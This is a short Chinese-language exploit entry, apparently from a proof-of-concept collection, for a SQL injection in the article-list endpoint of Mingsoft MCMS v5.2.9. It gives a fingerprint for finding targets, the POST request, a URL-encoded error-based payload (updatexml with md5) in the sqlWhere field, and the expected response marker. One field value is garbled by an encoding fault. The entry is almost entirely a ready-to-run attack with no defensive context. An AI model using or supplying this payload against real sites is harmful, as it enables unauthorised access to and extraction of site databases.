# MingsoftMCMSv5.2.9前台查询文章列表接口SQL注入

MingsoftMCMSv5 ｜ SQL注入 ｜ —
- **指纹**：`body="铭飞MCMS"`
- **请求**：`POST /cms/content/list.do HTTP/1.1`

**Payload**
```
categoryType=1&sqlWhere=%5b%7b%22action%22%3a%22and%22%2c%22field%22%3a%22updatexml(1%2cconcat(0x7e%2c(SELECT%20%20md5(1))%2c0x7e)%2c1)%22%2c%22el%22%3a%22eq%22%2c%22model%22%3a%22contentTitle%22%2c%22name%22%3a%22æç« æ é¢%22%2c%22type%22%3a%22input%22%2c%22value%22%3a%22111%22%7d%5d&pageNo=1&pageSize=10
```
- **响应特征**：200 a0b923820dcc509a